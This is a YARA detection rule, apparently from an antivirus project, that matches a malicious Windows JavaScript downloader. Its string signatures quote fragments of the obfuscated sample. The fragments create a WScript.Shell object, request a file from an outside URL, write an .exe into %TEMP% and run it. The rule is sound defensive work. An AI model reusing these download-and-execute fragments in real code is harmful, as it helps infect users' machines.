rule sig_20160330_d450ce8bda0bfc063ac1cbc86736d952 {
  meta:
    description = "datamaliciousorder - file 20160330_d450ce8bda0bfc063ac1cbc86736d952.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "347863cc683e535081b0d3584dd5af5c076a4e358c93a880d7d0f99b949f6cfc"

  strings:
    $s1  = "function _J(_N1, _Y){_XB = _XB * 1; return _N1 - _Y;};" fullword ascii
    $s2  = "var _L0 = function _R() {return WScript[_SB](\"WScript\"+\".Shell\");}(), _DN = 11;" fullword ascii
    $s3  = "_I[_L](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s4  = "if (_I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YW(){return _IO + \"\";};" fullword ascii
    $s6  = "function _A() {return _L0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Mbv66Jl7Qt.ex\" + \"e\";};" fullword ascii
    $s7  = "function _F(_VF){_L0[\"Run\"](_VF, _XB, _XB);};" fullword ascii
    $s8  = "function _M() {return ((_VZ == true) && (_VZ == _E)) ? 1 : _XB;};" fullword ascii
    $s9  = " while (_A0){" fullword ascii
    $s10 = "function _S(){return 22;};" fullword ascii
    $s11 = "var _X = new this[\"Date\"]();" fullword ascii
    $s12 = "function _LM()" fullword ascii
    $s13 = "function _N(){return _SB;};" fullword ascii
    $s14 = "return _J(_ZK, _N0);" fullword ascii
    $s15 = "function _RB(_SY) {var _OJ = (1, 2, 3, 4, 5, _SY); return _OJ;};" fullword ascii
    $s16 = "var _E = false;" fullword ascii
    $s17 = "_E = true; " fullword ascii
    $s18 = "var _HA = false;" fullword ascii
    $s19 = "_VZ = true; " fullword ascii
    $s20 = "var _VZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}